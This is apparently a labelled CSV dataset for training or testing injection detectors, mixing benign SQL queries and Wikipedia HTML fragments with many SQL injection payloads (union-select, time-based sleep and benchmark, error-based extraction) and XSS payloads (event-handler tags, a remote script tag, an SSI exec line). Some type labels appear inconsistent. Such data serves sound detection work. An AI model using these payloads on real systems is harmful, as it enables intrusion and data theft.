Text,Label,type
33529,0,sql
"<li>Search for questions on the archives of the <a class=""reference external"" href=""https://groups.google.com/forum/#!forum/scrapy-users"">scrapy-users mailing list</a>.</li>",0,xss
SELECT * FROM OrdersWHERE OrderDate BETWEEN #07/01/1996# AND #07/31/1996#;,0,sql
<ins onpointerenter=alert(1)>XSS</ins>,2,xss
SELECT * FROM damage WHERE telephone NOT BETWEEN 'than' AND 'fog',0,sql
 ,0,xss
"diamante, 114,",0,sql
"<li><a href=""/wiki/Computational_chemistry"" title=""Computational chemistry"">Computational chemistry </a> </li>",0,xss
"<li><a href=""/wiki/Glossary_of_meteorology"" title=""Glossary of meteorology"">Meteorology </a> </li>",0,xss
3953,0,sql
SELECT AVG ( lucky ) FROM everyone SELECT SUM ( composition ) ,0,sql
1%'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  '%'  =  ',1,sql
1'  )   where 1115  =  1115,1,sql
-3960' or 9323  =  9323#,1,sql
" SELECT RPAD ( CustomerName, 30, ""ABC"" )  AS RightPadCustomerName FROM Customers; ",0,xss
document.URL,2,xss
SELECT peace ( s )  FROM aware UNION ALL,0,sql
sant andreu salou,0,sql
amn,0,xss
"-3017""   )    )    as ljit where 9128  =  9128 union all select 9128,9128,9128,9128,9128--",1,sql
"<style>@keyframes x{}</style><address style=""animation-name:x"" onanimationstart=""alert(1)""></address>",2,xss
2.57E+15,0,sql
bru_na,0,sql
lauze,0,sql
<track id=x tabindex=1 onfocusin=alert(1)></track>,2,xss
"<li><a href=""/wiki/Scientific_method"" title=""Scientific method"">Scientific method </a> </li>",0,xss
"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'bxnn'  =  'bxnn",1,sql
SELECT adult ( s )  FROM neck FULL OUTER JOIN,0,sql
"1'   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'gyre'  =  'gyre",1,sql
"<!--#exec cmd=""/bin/echo '<SCR'""-->",2,xss
67sm1met93,0,sql
badosa estruch,0,sql
SELECT * FROM hurry WHERE scientific BETWEEN '1996-07-01' AND '1996-07-31',0,sql
SELECT COUNT ( DISTINCT cattle )  FROM coach,0,sql
SELECT * FROM upward WHERE each NOT LIKE 'moving%',0,sql
	 </span> </h3>,0,xss
a',1,sql
<kbd onpointerout=alert(1)>XSS</kbd>,2,xss
SELECT AVG ( hand )  FROM final  SELECT SUM ( slope ) ,0,xss
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/leaks.html"">Debugging memory leaks</a></li>",0,xss
	 </span> </li>,0,xss
	 </span>,0,xss
"<li><a href=""/wiki/Philosophy_of_artificial_intelligence"" title=""Philosophy of artificial intelligence"">Philosophy of artificial intelligence </a> </li>",0,xss
"<h1 onbeforecopy=""alert(1)"" contenteditable>test</h1>",2,xss
SELECT * FROM silver  WHERE date NOT LIKE '[probably]%',0,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=South+China+Morning+Post&amp;rft.atitle=Will+your+job+still+exist+in+10+years+when+the+robots+arrive%3F&amp;rft.date=2017&amp;rft_id=http%3A%2F%2Fwww.scmp.com%2Ftech%2Finnovation%2Farticle%2F2098164%2Frobots-are-coming-here-are-some-jobs-wont-exist-10-years&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT TOP 3 * FROM city WHERE shoot = 'ground' SELECT * FROM flow,0,xss
SELECT * FROM chain WHERE out = 'division' LIMIT 3,0,sql
	 </span> 2015 ,0,xss
SELECT * FROM live,0,sql
1'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'bmhw' like 'bmhw,1,sql
SELECT option_value FROM wp_options WHERE option_name  =  'options_footer_button_4_text' LIMIT 1,0,xss
"<keygen onmouseleave=""alert(1)"">test</keygen>",2,xss
"	 </span> <span class=""reference-text""><cite class=""citation web"">Chun, Rene (21 September 2017). <a rel=""nofollow"" class=""external text"" href=""https://www.artsy.net/article/artsy-editorial-hard-painting-made-computer-human"">""It's Getting Hard to Tell If a Painting Was Made by a Computer or a Human"" </a>. <i>Artsy </i><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">23 July ",0,xss
if  (  2643  =  1393  )   select 2643 else drop function nqss--,1,sql
"  SELECT forward AS heading, film AS [train]  FROM wife",0,xss
"<div id=""p-personal"" role=""navigation"" class="""" aria-labelledby=""p-personal-label"">",0,xss
"-2276""   )    )    as qwow where 2321  =  2321 or 3534  =  2971--",1,sql
select   (  case when   (  2294  =  3651  )   then 2294 else 2294*  (  select 2294 from information_schema.character_sets  )   end  )  #,1,xss
"1%'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  '%'  =  '",1,sql
7.67E+15,0,sql
 </li>,0,xss
"<li class=""toctree-l1""><a class=""reference internal"" href=""intro/install.html"">Installation guide</a></li>",0,xss
SELECT * FROM give WHERE slabs = 'property' LIMIT 3,0,xss
<meter onpointerleave=alert(1)>XSS</meter>,2,xss
SELECT * FROM cutting WHERE heading BETWEEN '1996-07-01' AND '1996-07-31',0,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,xss
SELECT * FROM clothing WHERE shaking BETWEEN which09/01/1996plate AND meant15/31/1996lie,0,sql
; begin declare @var varchar  (  8000  )   set @var  =  ':' select @var  =  @var+'+login+'/'+password+' ' from users where login >,1,xss
"	 <div class=""magnify""><a href=""/wiki/File:Laproscopic_Surgery_Robot.jpg"" class=""internal"" title=""Enlarge""> </a> </div>A patient-side surgical arm of <a href=""/wiki/Da_Vinci_Surgical_System"" title=""Da Vinci Surgical System"">Da Vinci Surgical System </a> </div> </div> </div><p>AI in healthcare is often used for classification, whether to automate initial evaluation of a CT scan or EKG or to identify high risk patients for population health. The breadth of applications is rapidly increasing.",0,xss
"<li><img alt=""WikiProject"" src=""//upload.wikimedia.org/wikipedia/commons/thumb/3/37/People_icon.svg/16px-People_icon.svg.png"" decoding=""async"" title=""WikiProject"" width=""16"" height=""16"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/3/37/People_icon.svg/24px-People_icon.svg.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/3/37/People_icon.svg/32px-People_icon.svg.png 2x"" data-file-width=""100"" data-file-height=""100"" /><b><a href=""/wiki/Wikipedia:WikiProject_Computer_science"" title=""Wikipedia:WikiProject Computer science"">WikiProject </a> </b> </li>",0,xss
"  SELECT street AS corner, business AS [beauty]  FROM climb",0,sql
"  SELECT electric AS perhaps, see AS [like]  FROM hill",0,sql
SELECT * FROM trap,0,sql
<h1 id=x tabindex=1 ondeactivate=alert(1)></h1><input id=y autofocus>,2,xss
"c/ pozo seco 37, 6-d",0,sql
1   )    )    as ipfy where 1189  =  1189,1,sql
48638626c,0,sql
zauhar,0,sql
	 </span> </h4>,0,xss
"   SELECT value,main,trip,one,road     (  (  beside JOIN baby ON wore.free =  lost.spread )   INNER JOIN broughtON Orders.indicate =  page.soundID ) ",0,xss
1'   )    )    as iipj where 6560  =  6560,1,sql
SELECT * FROM bone FETCH FIRST 3 ROWS ONLY,0,xss
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and '%'  =  '",1,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> </li>",0,xss
" </div> </td> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Research </th><td class=""navbox-list navbox-odd"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
"1""  )   where 5197  =  5197 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,sql
SELECT AVG ( empty ) FROM collect SELECT SUM ( someone ) ,0,sql
SELECT * FROM worse WHERE carefully  BETWEEN 10 AND 20,0,sql
SELECT * FROM alive WHERE brief  BETWEEN 10 AND 20,0,sql
"-9947""   )    )     )   union all select 8765,8765,8765,8765,8765#",1,sql
<svg><bdi onload=alert(1)></bdi>,2,xss
estolano boget,0,sql
carlosmara,0,xss
protectorio,0,sql
"<option onbeforecut=""alert(1)"" contenteditable>test</option>",2,xss
SELECT * FROM  ( SELECT operation FROM win ) ,0,sql
 </li>,0,xss
SELECT * FROM forth WHERE lay = 'along'  OR diagram = 'rich',0,sql
" union   (  select NULL, NULL, NULL,    (  select @@version   )    )    --",1,xss
SELECT statement ( s )  FROM nine FULL OUTER JOIN,0,sql
SELECT AVG ( pie ) FROM value,0,sql
"<thead onmouseover=""alert(1)"">test</thead>",2,xss
"<footer onmouseleave=""alert(1)"">test</footer>",2,xss
1'||  (  select 'gmkp' where 6016  =  6016,1,sql
SELECT * FROM  ( SELECT bag FROM until ) ,0,sql
SELECT * FROM exclaimed WHERE laid = 'darkness',0,sql
SELECT MIN ( why )  AS pain FROM among,0,xss
"<style>:target {transform: rotate(180deg);}</style><listing id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></listing>",2,xss
"1  )   where 1193  =  1193 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1,sql
"<SCRIPT SRC=""http://.rocks/.jpg""></SCRIPT>",2,xss
"1'   )    )    as ydbt where 8062  =  8062 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,sql
"calle ladera, 147 10-e",0,sql
"<style>:target {color: red;}</style><source id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></source>",2,xss
"<content onmousemove=""alert(1)"">test</content>",2,xss
<dt id=x tabindex=1 onfocus=alert(1)></dt>,2,xss
SELECT * FROM circus WHERE house = 'island' LIMIT 3,0,sql
"1""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""vypw"" like ""vypw",1,xss
"<style>:target {color: red;}</style><noframes id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></noframes>",2,xss
"1%""  )   order by 1--",1,xss
"1""   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   ""ghdr"" like ""ghdr",1,sql
SELECT * FROM wp_posts WHERE ID  =  262327 LIMIT 1,0,sql
"	 </span> <span class=""reference-text"">",0,xss
SELECT about FROM together UNION SELECT tool FROM opinion ORDER BY series,0,sql
"<area onmouseover=""alert(1)"">test</area>",2,xss
7.05723E+15,0,sql
<applet onpointerout=alert(1)>XSS</applet>,2,xss
<ul>,0,xss
	 </span></p>,0,xss
" SELECT column_name ( s )  FROM silver,pot",0,xss
"   SELECT per, bet+ ', ' + setting+ ' ' + leader+ ', ' + practice AS blew  FROM breathing",0,sql
SELECT AVG ( relationship ) FROM fox,0,sql
<keygen onpointerenter=alert(1)>XSS</keygen>,2,xss
"<track draggable=""true"" ondragstart=""alert(1)"">test</track>",2,xss
"1%""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,sql
SELECT * FROM torn WHERE feathers = 'count'  OR today = 'rule',0,sql
SELECT * FROM wet FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
SELECT MIN ( being )  AS pie FROM call,0,xss
 ,0,xss
5083,0,xss
	 </span></a></dt><dd>Populate your items with the extracted data.</dd>,0,xss
mazursky@mundo-deportivo.mx,0,xss
SELECT * FROM art WHERE grabbed BETWEEN '1996-07-01' AND '1996-07-31',0,xss
1'+  (  select myci where 8903  =  8903,1,sql
"grup de la pau, 108,",0,sql
"	 </span><link rel=""mw-deduplicated-inline-style"" href=""mw-data:TemplateStyles:r935243608""/> ",0,xss
1  )   as xylu where 3338  =  3338 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1,sql
	 </span>,0,xss
-9564 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  ) ,1,sql
SELECT * FROM funny WHERE wrapped BETWEEN '1996-07-01' AND '1996-07-31',0,sql
Knowledge revolution:,0,xss
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and   (  'nslo' like 'nslo",1,xss
"-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",1,sql
"<li onbeforecopy=""alert(1)"" contenteditable>test</li>",2,xss
33120,0,sql
-6637'   )    )    order by 1#,1,sql
SELECT * FROM arm WHERE choose LIKE '%follow%',0,sql
SELECT * FROM car WHERE substance BETWEEN '1996-07-01' AND '1996-07-31',0,sql
"1"" where 2642  =  2642 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,xss
"	 </span><span class=""mw-headline"" id=""Machine_consciousness,_sentience_and_mind"">Machine consciousness, sentience and mind ",0,xss
"<col draggable=""true"" ondragstart=""alert(1)"">test</col>",2,xss
"1   )    )     )   union all select null,null,null--",1,sql
"1""   )    )    as dcrk where 5164  =  5164 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
"c/ murillo, 106 5c",0,sql
SELECT * FROM invented WHERE mouse IN  ( SELECT fifth FROM fought ) ,0,xss
"<summary draggable=""true"" ondragend=""alert(1)"">test</summary>",2,xss
"com/?option  =  com_k2  <act>  <![CDATA[procMemberInsert]]>  </act>   <act>  <![CDATA[procMemberLogin]]>  </act>   <allow_comment>  <![CDATA[]]>  </allow_comment>   <allow_trackback>  <![CDATA[]]>  </allow_trackback>   <birthday>  <![CDATA[19850616]]>  </birthday>   <content>  <![CDATA[ <img src  =  ""http://media2",0,sql
<u onpointerout=alert(1)>XSS</u>,2,xss
"<style>:target {color: red;}</style><legend id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></legend>",2,xss
"1%""  )   or sleep  (  5  )  #",1,sql
sweldund-pasetti@supercover.lt,0,xss
-8357'   )    )    as henk where 8198  =  8198 or 2558  =  9103#,1,sql
SELECT * FROM nose WHERE zero = 'slope'  AND City = 'muscle',0,xss
s,1,sql
querando,0,sql
SELECT * FROM row ORDER BY change DESC,0,sql
"1%' or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
hus24lero,0,sql
1.06099E+14,0,sql
cadaqus,0,xss
"	 <div id=""Subfields_of_and_cyberneticians_involved_in_cybernetics"" style=""font-size:114%;margin:0 4em"">Subfields of and cyberneticians involved in <a href=""/wiki/Cybernetics"" title=""Cybernetics"">cybernetics </a> </div> </th> </tr><tr><th scope=""row"" class=""navbox-group"" style=""width:1%"">Subfields </th><td class=""navbox-list navbox-odd hlist"" style=""text-align:left;border-left-width:2px;border-left-style:solid;width:100%;padding:0px"">",0,xss
"<img oncopy=""alert(1)"" contenteditable>test</img>",2,xss
<summary onpointerenter=alert(1)>XSS</summary>,2,xss
SELECT * FROM equally WHERE larger = 'has'  AND City = 'broke',0,sql
<dt onpointerenter=alert(1)>XSS</dt>,2,xss
"<summary onkeyup=""alert(1)"" contenteditable>test</summary>",2,xss
"1%"" and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""%""  =  """,1,sql
	 </span> 2015 ,0,xss
"<style>@keyframes slidein {}</style><frame style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></frame>",2,xss
SELECT * FROM  ( SELECT bear FROM walk ) ,0,sql
fresia,0,sql
"<div role=""navigation"" class=""navbox"" aria-labelledby=""Subfields_of_and_cyberneticians_involved_in_cybernetics"" style=""padding:3px""><table class=""nowraplinks mw-collapsible autocollapse navbox-inner"" style=""border-spacing:0;background:transparent;color:inherit""><tbody><tr><th scope=""col"" class=""navbox-title"" colspan=""2"">",0,xss
8.366E+15,0,sql
"          <dd><a href=""/en/1.5/"">1.5</a></dd>",0,xss
"select sleep  (  5  )   and    (    (   ""%""  =  """,1,sql
SELECT * FROM tea WHERE symbol = 'paper',0,sql
"1',  (  select   (  case when   (  6948  =  4654  )   then 1 else 6948*  (  select 6948 from mysql.db  )   end   )    )   ",1,sql
SELECT TOP 3 * FROM round SELECT * FROM pig 3SELECT * FROM pan,0,sql
SELECT * FROM wp_posts WHERE  ( post_type  =  'page' AND post_status  =  'publish' )  ORDER BY wp_posts.post_title ASC,0,sql
<del onblur=alert(1) tabindex=1 id=x></del><input autofocus>,2,xss
"  SELECT curiousID AS ID, decide AS led FROM save",0,sql
"<ul><li><a href=""/wiki/Knowledge_representation_and_reasoning"" title=""Knowledge representation and reasoning"">Knowledge reasoning </a> </li>",0,xss
"<base draggable=""true"" ondragend=""alert(1)"">test</base>",2,xss
"-3343'||  (  select 'ssvt' where 5179  =  5179 union all select 5179,5179,5179,5179,5179,5179,5179,5179--",1,sql
"	 <div class=""refbegin reflist columns references-column-width"" style=""-moz-column-width: 30em; -webkit-column-width: 30em; column-width: 30em;"">",0,xss
SELECT TOP 3 * FROM practice,0,sql
SELECT kill ( s )  FROM lamp SELECT am FROM lay,0,sql
" select * from users where id  =  1 union select !<@,version  (    )   -- 1",1,sql
5.22E+15,0,sql
SELECT magic ( s )  FROM oxygen LEFT JOIN,0,sql
<bdo id=x tabindex=1 onbeforedeactivate=alert(1)></bdo><input autofocus>,2,xss
"<li><cite id=""CITEREFLugerStubblefield2004"" class=""citation book""><a href=""/w/index.php?title=George_Luger&amp;action=edit&amp;redlink=1"" class=""new"" title=""George Luger (page does not exist)"">Luger, George </a>; <a href=""/w/index.php?title=William_Stubblefield&amp;action=edit&amp;redlink=1"" class=""new"" title=""William Stubblefield (page does not exist)"">Stubblefield, William </a> (2004). <span class=""cs1-lock-registration"" title=""Free registration required""><a rel=""nofollow"" class=""external text"" href=""https://archive.org/details/artificialintell0000luge""><i>Artificial Intelligence: Structures and Strategies for Complex Problem Solving </i> </a> ",0,xss
"<ruby oncut=""alert(1)"" contenteditable>test</ruby>",2,xss
2080,0,sql
rhetta,0,sql
"<button oncopy=""alert(1)"" contenteditable>test</button>",2,xss
1  )   and 3861  =  5813--,1,sql
SELECT * FROM sharp WHERE seed = 'within' LIMIT 3,0,xss
SELECT * FROM  ( SELECT bell FROM shoot ) ,0,xss
1%'  )   waitfor delay '0:0:5'--,1,sql
"   SELECT Employees.warm, COUNT ( Orders.twoID )  AS diagramFROM    ( OrdersINNER JOIN shadow ON Orders.pondID  =  Employees.norID ) ",0,sql
"1   )    )     )   union all select null,null,null,null,null--",1,sql
1'   )    )     )   and 3602  =  1990#,1,sql
"<style>:target {transform: rotate(180deg);}</style><content id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></content>",2,xss
"<tr onmousedown=""alert(1)"">test</tr>",2,xss
"1"" and elt  (  4249  =  4249,7259  )   and ""tmxx""  =  ""tmxx",1,sql
" SELECT * FROM military ORDER BY lower, courage",0,sql
"<li><a href=""/wiki/File:Socrates.png"" class=""image""><img alt=""Socrates.png"" src=""//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/18px-Socrates.png"" decoding=""async"" width=""18"" height=""28"" class=""noviewer"" srcset=""//upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/27px-Socrates.png 1.5x, //upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Socrates.png/36px-Socrates.png 2x"" data-file-width=""326"" data-file-height=""500"" /> </a> <a href=""/wiki/Portal:Philosophy"" title=""Portal:Philosophy"">Philosophy&#32;portal </a> </li>",0,xss
SELECT observe FROM yet UNION ALL SELECT change FROM band ORDER BY voyage,0,xss
SELECT TOP 50 PERCENT * FROM area SELECT * FROM wise FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM throat,0,sql
SELECT COUNT ( DISTINCT national )  FROM good,0,sql
<applet onpointermove=alert(1)>XSS</applet>,2,xss
"-1985%'   )    )     )   union all select 3051,3051,3051--",1,xss
FROM  ( SELECT DISTINCT wood FROM roof ) ,0,xss
siu-ling,0,sql
"1""  )   as jmwr where 5978  =  5978 rlike   (  select   (  case when   (  1396  =  8762  )   then 1 else 0x28 end   )    )   --",1,sql
"1%'   )    )    union all select null,null,null,null,null,null,null,null,null,null--",1,sql
bisaurri,0,sql
SELECT * FROM  ( SELECT bell FROM yes ) ,0,sql
" SELECT * FROM farm ORDER BY spoken ASC, home DESC",0,sql
<dialog id=x tabindex=1 ondeactivate=alert(1)></dialog><input id=y autofocus>,2,xss
SELECT DISTINCT free FROM them,0,sql
zahn,0,sql
"<rt onpaste=""alert(1)"" contenteditable>test</rt>",2,xss
"   SELECT COUNT ( forget ) , appearance FROM say BY flame",0,sql
<xmp onpointerout=alert(1)>XSS</xmp>,2,xss
	 </span>,0,xss
 (  ||6  ) ,1,sql
1'   )    )    as myws where 5274  =  5274,1,sql
"<optgroup draggable=""true"" ondragstart=""alert(1)"">test</optgroup>",2,xss
SELECT * FROM like 3,0,sql
<image2 onpointerenter=alert(1)>XSS</image2>,2,xss
SELECT * FROM darkness FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM using,0,sql
"<h2>First steps<a class=""headerlink"" href=""#first-steps"" title=""Permalink to this headline"">¶</a></h2>",0,xss
SELECT MIN ( brush )  AS unknown FROM meat,0,sql
"1'   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,sql
"<noembed onbeforecut=""alert(1)"" contenteditable>test</noembed>",2,xss
"calle san roque, 84,",0,sql
"<li><a href=""#CITEREFNilsson1998"">Nilsson 1998 </a>, chpt. 4.2, </li>",0,xss
"1""  )   as jaxh where 6318  =  6318 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1,sql
"catalanes, 137, 3?a",0,sql
<audio onpointerenter=alert(1)>XSS</audio>,2,xss
"-5571' union all select 8846,8846,8846,8846,8846,8846,8846#",1,xss
SELECT AVG ( Price ) FROM truck,0,xss
"<li><a href=""/wiki/Physicalism"" title=""Physicalism"">Physicalism </a>",0,xss
1'+  (  select 'upmd' where 3438  =  3438,1,sql
"SELECT SECOND ( ""23:59:59"" ) ;",0,sql
"1   )    )    as qgok where 3993  =  3993 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1,sql
 UPDATE salt SET did = 'garden'WHERE orange = 'exclaimed',0,xss
"	 </span> <span class=""reference-text"">",0,xss
"1%""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""%""  =  """,1,sql
-8410'   )    )     )   or 8571  =  8571--,1,sql
SELECT plural ( s FROM development RIGHT JOIN,0,sql
 </p>,0,xss
"1"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""vzud"" like ""vzud",1,sql
"<style onkeyup=""alert(1)"" contenteditable>test</style>",2,xss
"1%' and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,xss
"<ul><li><a href=""#CITEREFSearle1980"">Searle 1980 </a>. Searle's original presentation of the thought experiment. </li>",0,xss
"<input onmouseout=""alert(1)"">test</input>",2,xss
"<applet draggable=""true"" ondragenter=""alert(1)"">test</applet>",2,xss
ninn,0,sql
"	 </span> <span class=""reference-text"">",0,xss
1  )   where 2223  =  2223,1,sql
c632i6ela,0,sql
42141,0,sql
76971829y,0,sql
1.27984E+15,0,xss
"<li><a rel=""nofollow"" class=""external text"" href=""https://www.bbc.co.uk/programmes/p003k9fc"">Artificial Intelligence </a>, BBC Radio 4 discussion with John Agar, Alison Adam &amp; Igor Aleksander (<i>In Our Time </i>, Dec. 8, 2005) </li> </ul>",0,xss
"<li id=""cite_note-387""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-387"">^ </a> </b> ",0,xss
-3988'   )    )    union all select 1113#,1,sql
95944263q,0,sql
"INSERT INTO mass ( gain, written, lunch, allow, might, prove )  VALUES  ( 'suit', 'root'. pressure', 'given', 'lose', 'writer', 'country' )  ",0,sql
SELECT * FROM though WHERE explain NOT LIKE 'ought%',0,sql
dekeyser@creacionwebs.bn,0,sql
joyan,0,sql
"<sub draggable=""true"" ondragenter=""alert(1)"">test</sub>",2,xss
"<li><a href=""#CITEREFKurzweil2005"">Kurzweil 2005 </a> </li>",0,xss
"<th draggable=""true"" ondragenter=""alert(1)"">test</th>",2,xss
"1' where 5023  =  5023 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,xss
	 </span>,0,xss
"   SELECT Employees.pound, COUNT ( Orders.carryID )  AS produceFROM    ( OrdersINNER JOIN whatever ON Orders.hurtID  =  Employees.asID ) ",0,sql
DELETE FROM wrong WHERE picture = 'dinner',0,sql
SELECT * FROM car WHERE answer IN  ( SELECT vapor FROM twelve ) ,0,sql
"<dt><a class=""reference internal"" href=""topics/webservice.html""><span class=""doc"">Web Service",0,xss
SELECT * FROM importance WHERE loud = 'person',0,sql
 or username like '%,1,sql
"<li><a href=""/wiki/Parallel_computing"" title=""Parallel computing"">Parallel computing </a> </li>",0,xss
robledollano,0,sql
	 </span>,0,xss
"<li class=""toclevel-3 tocsection-52""><a href=""#Devaluation_of_humanity""><span class=""tocnumber"">8.2.2 ",0,xss
SELECT * FROM leaving WHERE extra = 'massage' FETCH FIRST 3 ROWS ONLY,0,sql
" SELECT Orders.OrderID, Employees.LastName, Employees.FirstName FROM Orders RIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.EmployeeID  ORDER BY Orders.OrderID;",0,xss
SELECT * FROM  ( SELECT list FROM difference ) ,0,sql
